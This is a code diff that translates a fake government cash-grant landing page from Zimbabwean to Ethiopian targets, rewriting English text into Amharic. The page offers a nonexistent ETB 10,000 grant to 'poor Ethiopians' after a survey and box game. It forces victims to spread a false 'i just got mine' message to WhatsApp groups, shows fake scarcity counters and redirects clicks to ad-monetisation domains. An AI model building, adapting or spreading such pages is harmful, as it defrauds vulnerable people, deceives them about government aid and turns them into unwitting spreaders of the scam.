@@ -292,13 +292,12 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">እንኳን ደስ ያለህ! መልሶችህ ተቀምጠዋል</h2>
  
 <p class="paragraph">
-Now you have a chance to win ZWD20:000 Monthly Empowerment cash Grant<br><br>
-You have 3 chances ! we wish you good luck
-<br><br>
-You need to select the box that has the gift inside the boxes.
+አሁን ኢቲቢ10,000 ወርሃዊ የማበረታቻ የገንዘብ ስጦታ የማሸነፍ እድል አልዎት<br><br>
+3 እድሎች አሉዎት! መልካም እድል እንመኝልዎታለን<br><br>
+በሳጥኖቹ ውስጥ ስጦታ ያለውን ሳጥን መምረጥ ያስፈልግዎታል.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -308,7 +307,7 @@ Start
 <vue-modal :open="showFailModal">
 <h2 class="heading heading--h1">Better luck next time</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+(2) ተጨማሪ እድሎች አሎት። 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -316,16 +315,16 @@ OK
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Zimbabwean_banknote_collage%2C_fourth_dollar.png/800px-Zimbabwean_banknote_collage%2C_fourth_dollar.png" style="width: 240px;">
+<img src="https://www.shutterstock.com/image-illustration/3d-rendering-stack-ethiopian-birr-260nw-2125700009.jpg" style="width: 240px;">
 <h1 class="heading heading--h1">Congratulations! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> ZWL100,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+የእርስዎ ስጦታ ነው።: <b>ኢቲቢ10,000 cash</b><br>ሽልማትዎን ለማግኘት በሚቀጥለው ገጽ ላይ ያሉትን መመሪያዎች ይከተሉ ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
-Ok
+እሺ
 </button>
 </vue-modal>
   
@@ -341,9 +340,9 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*</b>, Dont miss this year ZWD20,000  cash grant to Zimbabweans.
+እንኳን በደህና መጡ <b>*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*</b>, ዘንድሮ እንዳያመልጥዎ 10,000 ብር ለኢትዮጵያውያን የተሰጠ.
 <br>
-Answer the questions below to claim <b>ZWL100,000 Cash Prize</b>
+ለመጠየቅ ከታች ያሉትን ጥያቄዎች ይመልሱ <b>ኢቲቢ10,000 የገንዘብ ሽልማት</b>
 </p>
   <br>
 </div>
@@ -353,58 +352,55 @@ Answer the questions below to claim <b>ZWL100,000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
+                     "እባክዎን ትንሽ ይጠብቁ...",
+              "እባክዎን ትንሽ ይጠብቁ...",
               "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+ከጥያቄዎቹ ውስጥ 4/4ቱን መልሰዋል።
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+መልሶችዎ በሂደት ላይ ናቸው።<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+አሁንም ሽልማቶች ይገኛሉ!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+ስጦታዎችን በመፈለግ ላይ..<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+(289) ስጦታዎች ብቻ ይቀራሉ!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+ክምችት እየተጣራ ነው።<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of Zimbabwe?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "የኢትዮጵያ ዜጋ ነህ?",
+              answers: [ { text: "አዎ" }, { text: "አይ" } ]
             },
                                                              {
-              title: "Do You Have I.D?)",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "I.D አለህ?)",
+              answers: [ { text: "አዎ" }, { text: "አይ" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "ጾታዎን ይምረጡ?",
+              answers: [ { text: "ወንድ" }, { text: "ሴት" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "የዕድሜ ክልልዎን ይምረጡ?",
+              answers: [ { text: "18-20 ዓመታት" }, { text: "21 - 25ዓመታት" }, { text: "26 - 30 ዓመታት" }, { text: "30 ዓመታት በላይ" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -419,17 +415,17 @@ Stock is being checked
 <p>Congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrZPnbSXSb91PTLralpXUFq9tNuaPpw8iUld-ZUmzlsT2yLtP0bxi1F0mHvvbrjnsBxOqeplfgMU48KamYv0hNTEbie2-XBEP1YWzj9Y8jfw3ui8Oow1bg2oonPkbJvl4BOHrkhwVLeaQcYukN1uIrn6QrybHWVAgVeGjAgQVT1VA5pcKaw8-ubuqIeywI/w640-h640/IMG_6542.jpeg" width='81%'/> </center>
+                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZSCNxLQ2qJFpTSBReddROfqRUZInx-gJ7Z1gjK1_V4HmCM7N7QUytEqzJRVP1uZQC8iLUjWaAUNx435MjHdvyMbkkad1I_bB94QKw8-5gSwuSVk4IMNo4PEfgW6Tiaogo0DloZ6TA-aveZtSV80EmCdkmzUuUgCqWTPnmNzIY_S4B8uUUl8x64sKMOd_3/w640-h548/IMG_6538.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Grant is: <b>ZWD20,000</b> <br>Follow the instructions below to your Get Your Grant !</p>
+<p class="txt1">የእርስዎ ስጦታ ነው።: <b>ኢቲቢ10,000</b> <br>ስጦታዎን ለማግኘት ከዚህ በታች ያሉትን መመሪያዎች ይከተሉ!</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.ከ 5 ቡድኖች / 15 ጓደኞች ጋር በ "Whatsapp" ላይ ያካፍሉ (ከዚህ በታች ያለውን የ "Whatsapp" አዶን ጠቅ ያድርጉ)</p><p class="rules">2. "ቀጥል" ን ጠቅ ያድርጉ እና ሽልማትዎን ይጠይቁ.</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">ሼር ያድርጉ&nbsp;   →</div>
+  <h4 class="textlastup">ሰማያዊው አሞሌ እስኪሞላ ድረስ ያካፍሉ።!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -456,16 +452,16 @@ Stock is being checked
 <p>Congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Zimbabwean_banknote_collage%2C_fourth_dollar.png/800px-Zimbabwean_banknote_collage%2C_fourth_dollar.png" width='81%'/> </center>
+                                <center>   <img src="https://www.shutterstock.com/image-illustration/3d-rendering-stack-ethiopian-birr-260nw-2125700009.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>ZWD20,000 cash.</b> <br>Follow the instruction below to claim your Grant !</p>
+<p class="txt1">የእርስዎ ስጦታ ነው።: <b>ኢቲቢ 10,000 አውጣ.</b> <br>ለእርዳታዎ ለመጠየቅ ከዚህ በታች ያለውን መመሪያ ይከተሉ !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
-        <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM ZWD:20000</font></button>
+        <a  onclick="window.open('https://obqj2.com/4/9437824')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">የይገባኛል ጥያቄ ETB: 20000</font></button>
                     </a><br/> <br/>
 	     <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1711648,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
@@ -474,15 +470,15 @@ Stock is being checked
 
       <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
 
-	     <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
+	     <a  onclick="window.open('https://obqj2.com/4/9437824')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
                     </a><br/> <br/>
- <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
+ <a  onclick="window.open('https://obqj2.com/4/9437824')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw ZWD100,000</div> 
+            <div class="share_main_bt" id="offers">ኢቲቢ 10,000 አውጣ</div> 
       <br>
           
        
@@ -526,7 +522,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "ስህተት አለ!\nልጥፎች አይቆጠሩም። ለተመሳሳዩ ጓደኛ ወይም ቡድን ከአንድ ጊዜ በላይ አጋርተውት ሊሆን ይችላል፣ እባክዎን እንደገና ያጋሩ.",
             cpa = "https://thaudray.com/4/3077182",
             cpa1 = "https://thaudray.com/4/3077182",
             saved = "coke2",
@@ -535,10 +531,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ZWD20:000 instantly.%0A i just got mine%0A%0AClick Here👇%0A https://petiofre.org/Presidential-Youth-Fund.html ",
-    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ZWD20:000 instantly .%0A i just got mine%0A%0AClick Here👇%0A https://petiofre.org/Presidential-Youth-Fund.html ",
-    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ZWD20:000 instantly.%0A i just got mine%0A%0AClick Here👇%0A https://petiofre.org/Presidential-Youth-Fund.html ",
-    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ZWD20:000 instantly .%0A i just got mine%0A%0AClick Here👇%0A https://petiofre.org/Presidential-Youth-Fund.html ",
+    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*እንዴት ማግኘት እንደሚቻል*%0Aከታች ያለውን ሊንክ ይጎብኙ እና የሚከተሉትን ጥያቄዎች ይመልሱ እና ኢቲቢ10,000 ወዲያውኑ ያገኛሉ.%0Aየኔን ብቻ አገኘሁ%0A%0Aእዚህ ጠቅ ያድርጉ👇%0A https://petiofre.org/Pres-ETB-10000-Cash-Gifts.html ",
+    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*እንዴት ማግኘት እንደሚቻል*%0Aከታች ያለውን ሊንክ ይጎብኙ እና የሚከተሉትን ጥያቄዎች ይመልሱ እና ኢቲቢ10,000 ወዲያውኑ ያገኛሉ.%0A የኔን ብቻ አገኘሁ%0A%0Aእዚህ ጠቅ ያድርጉ👇%0A https://petiofre.org/Pres-ETB-10000-Cash-Gifts.html ",
+    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*እንዴት ማግኘት እንደሚቻል*%0Aከታች ያለውን ሊንክ ይጎብኙ እና የሚከተሉትን ጥያቄዎች ይመልሱ እና ኢቲቢ10,000ወዲያውኑ ያገኛሉ%0A%0Aእዚህ ጠቅ ያድርጉ👇%0A https://petiofre.org/Pres-ETB-10000-Cash-Gifts.html ",
+    "*ብር፡ 10፡000 ወርሃዊ የጥሬ ገንዘብ ክፍያ ለድሃ ኢትዮጵያውያን*%0A%0A*እንዴት ማግኘት እንደሚቻል*%0Aከታች ያለውን ሊንክ ይጎብኙ እና የሚከተሉትን ጥያቄዎች ይመልሱ እና ኢቲቢ10,000 ወዲያውኑ ያገኛሉ .%0Aየኔን ብቻ አገኘሁ%0A%0Aእዚህ ጠቅ ያድርጉ👇%0A https://petiofre.org/Pres-ETB-10000-Cash-Gifts.html",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -622,7 +618,7 @@ $("#offerss").click(function () {
    Swal.fire({
   icon: 'error',
   title: 'Unfortunately...',
-  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  text: 'ሽልማትዎን ለመቀበል ስለ ዝግጅታችን ከጓደኞችዎ ጋር መጋራት አለብዎት። ሰማያዊው አሞሌ እስኪሞላ ድረስ ያካፍሉ።!',
   
 });
    }
@@ -651,10 +647,10 @@ hs.src = ('//s10.histats.com/js15_as.js');
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="//thaudray.com/4/3077182";
+        location.href="https://obqj2.com/4/9437824";
     }
     function goon(){
-        location.href="//thaudray.com/4/3077182";
+        location.href="https://obqj2.com/4/9437824";
     }
 </script>
 
